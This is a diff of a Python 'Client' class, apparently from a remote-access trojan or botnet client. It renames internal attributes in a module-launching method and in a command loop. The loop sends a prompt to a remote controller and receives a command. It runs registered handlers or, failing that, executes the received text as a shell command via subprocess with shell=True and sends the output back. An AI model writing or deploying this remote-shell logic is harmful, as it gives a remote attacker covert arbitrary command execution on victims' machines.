@@ -822,9 +822,9 @@ class Client(object):
 
     @command
     def run_modules(self):
-        mods = [self.jobs.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in __modules__ if __modules__[mod].status if sys.platform in __modules__[mod].platforms if mod not in self.jobs]
+        mods = [self.threads.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
         for module in mods:
-            self.jobs[module].start()
+            self.threads[module].start()
         if not self.mode:
             return "Tasks complete."
 
@@ -837,8 +837,8 @@ class Client(object):
             self._send(prompt, method='prompt')   
             data = self._receive()
             cmd, _, action = data.partition(' ')
-            if cmd in __command__:
-                result = __command__[cmd](action) if len(action) else __command__[cmd]()
+            if cmd in self.cmds:
+                result = self.cmds[cmd](action) if len(action) else self.cmds[cmd]()
             else:
                 result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
             if result and len(result):
